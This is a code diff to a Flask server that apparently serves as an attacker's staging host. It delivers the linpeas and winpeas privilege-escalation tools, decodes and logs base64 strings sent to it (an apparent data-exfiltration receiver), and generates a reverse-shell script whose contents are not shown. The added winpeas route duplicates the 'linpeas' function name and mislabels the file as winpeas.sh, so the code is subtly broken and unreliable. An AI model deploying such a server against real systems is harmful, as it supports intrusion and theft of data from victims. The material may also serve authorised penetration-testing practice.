@@ -3,6 +3,7 @@ from flask import Flask, abort, json, send_file, request
 from formater import Formatter
 
 LINPEAS_PATH = None
+WINPEAS_PATH = None
 SHELL_PATH   = "shell.sh" 
 
 logger = logging.getLogger()
@@ -36,6 +37,9 @@ if args.verbose == None:
 
 api = Flask(__name__)
 
+# Accepts a file path
+# If requested file exists in the directory specified by the args.dir argument, the file is returned.
+# If file is specified a JSON response is sent to indicate the service is up
 @api.route('/', defaults={'req_path': ''})
 @api.route('/<path:req_path>')
 def dir_listing(req_path):
@@ -56,6 +60,8 @@ def dir_listing(req_path):
     
     return json.jsonify({"status": "online"}), 200, {}
 
+# Accepts a string to decode
+# Attempts to decode prvided strings and logs the decoded data
 @api.route('/base64/<encoded>')
 def decode_base64(encoded):
     logHeaders(args.verbose, request)
@@ -67,6 +73,7 @@ def decode_base64(encoded):
 
     return json.dumps({}), 200, {}
 
+# Returns the raw linpeas.sh file from wherever it is stored
 @api.route('/linpeas.sh')
 def linpeas():
     if not os.path.exists(LINPEAS_PATH):
@@ -74,6 +81,15 @@ def linpeas():
         return abort(404)
     return send_file(LINPEAS_PATH)
 
+# Returns the raw winpeas.sh file from wherever it is stored
+@api.route('/winpeas.exe')
+def linpeas():
+    if not os.path.exists(WINPEAS_PATH):
+        logger.critical("Winpeas not found")
+        return abort(404)
+    return send_file(WINPEAS_PATH)
+
+# Creats a reverse shell script and sends it back
 @api.route('/shell.sh')
 def shell():
     shellFile = open(SHELL_PATH, "w")
@@ -81,6 +97,7 @@ def shell():
     shellFile.close()
     return send_file(SHELL_PATH)
 
+# Logs each header in the request if enabled
 def logHeaders(verbose, request):
     if verbose:
         for h in request.headers:
